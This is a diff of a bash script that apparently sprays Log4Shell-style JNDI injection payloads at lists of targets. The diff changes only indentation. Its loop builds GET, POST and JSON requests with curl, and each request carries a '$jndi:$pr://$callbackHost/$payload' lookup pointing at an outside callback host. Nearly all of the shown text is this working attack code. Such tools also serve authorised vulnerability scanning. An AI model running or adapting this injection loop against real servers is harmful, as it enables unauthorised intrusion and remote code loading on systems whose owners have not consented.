@@ -229,50 +229,50 @@ setSharedVariables
 
 # Go through targets and protocols and send requests
 for target in "${targets[@]}" ; do
-		for pr in "${protocols[@]}"; do
-			for method in "${methods[@]}" ; do
-				# Set get and post parameters, and headers
-				processedGetParams="$(processGetParams)";
-				processedPostParams="$(processPostParams)";
-				processHeaders
-				echo -e "${Y}$method${STOP} ${G}$target$processedGetParams${STOP} ${O}$jndi:$pr://$callbackHost/$payload${STOP}";
-				
-				# SEND REQUESTS (this part may be improved)
-				# POST
-				if [[ $method == "POST" ]]; then
-					if [[ -z $urls ]]; then
-						 curl "$target$processedGetParams" "${processedHeaders[@]}" "-d${processedPostParams[@]}" "${processedExtraParams[@]}";
-					else
-						for url in "${urls[@]}"; do
-							curl "$target/$url$processedGetParams" "${processedHeaders[@]}" "-d${processedPostParams[@]}" "${processedExtraParams[@]}";
-						done
-					fi
-				# POSTJSON
-				elif [[ $method == "POSTJSON" ]]; then
-					# Create jsonFile for POSTJSON
-					createPostJsonFile
-					# POSTJSON request
-					if [[ -z $urls ]]; then
-						 curl "$target$processedGetParams" "${processedHeaders[@]}" -H "Content-Type: application/json" --data-binary "@$tmpJsonFile" "${processedExtraParams[@]}";
-					else
-						for url in "${urls[@]}"; do
-							curl "$target/$url$processedGetParams" "${processedHeaders[@]}" -H "Content-Type: application/json" --data-binary "@$tmpJsonFile" "${processedExtraParams[@]}";
-						done
-					fi
-				# GET
-				else
-					if [[ -z $urls ]]; then
-						 curl -X "$method" "$target$processedGetParams" "${processedHeaders[@]}" "${processedExtraParams[@]}";
-					else
-						for url in "${urls[@]}"; do
-							curl -X "$method" "$target/$url$processedGetParams" "${processedHeaders[@]}" "${processedExtraParams[@]}";
-						done
-					fi
-				fi;
+	for pr in "${protocols[@]}"; do
+		for method in "${methods[@]}" ; do
+			# Set get and post parameters, and headers
+			processedGetParams="$(processGetParams)";
+			processedPostParams="$(processPostParams)";
+			processHeaders
+			echo -e "${Y}$method${STOP} ${G}$target$processedGetParams${STOP} ${O}$jndi:$pr://$callbackHost/$payload${STOP}";
 
-				sleep "$timeout";
-				done;
+			# SEND REQUESTS (this part may be improved)
+			# POST
+			if [[ $method == "POST" ]]; then
+				if [[ -z $urls ]]; then
+					 curl "$target$processedGetParams" "${processedHeaders[@]}" "-d${processedPostParams[@]}" "${processedExtraParams[@]}";
+				else
+					for url in "${urls[@]}"; do
+						curl "$target/$url$processedGetParams" "${processedHeaders[@]}" "-d${processedPostParams[@]}" "${processedExtraParams[@]}";
+					done
+				fi
+			# POSTJSON
+			elif [[ $method == "POSTJSON" ]]; then
+				# Create jsonFile for POSTJSON
+				createPostJsonFile
+				# POSTJSON request
+				if [[ -z $urls ]]; then
+					 curl "$target$processedGetParams" "${processedHeaders[@]}" -H "Content-Type: application/json" --data-binary "@$tmpJsonFile" "${processedExtraParams[@]}";
+				else
+					for url in "${urls[@]}"; do
+						curl "$target/$url$processedGetParams" "${processedHeaders[@]}" -H "Content-Type: application/json" --data-binary "@$tmpJsonFile" "${processedExtraParams[@]}";
+					done
+				fi
+			# GET
+			else
+				if [[ -z $urls ]]; then
+					 curl -X "$method" "$target$processedGetParams" "${processedHeaders[@]}" "${processedExtraParams[@]}";
+				else
+					for url in "${urls[@]}"; do
+						curl -X "$method" "$target/$url$processedGetParams" "${processedHeaders[@]}" "${processedExtraParams[@]}";
+					done
+				fi
+			fi;
+
+			sleep "$timeout";
 		done;
+	done;
 done;
 
 cleanup
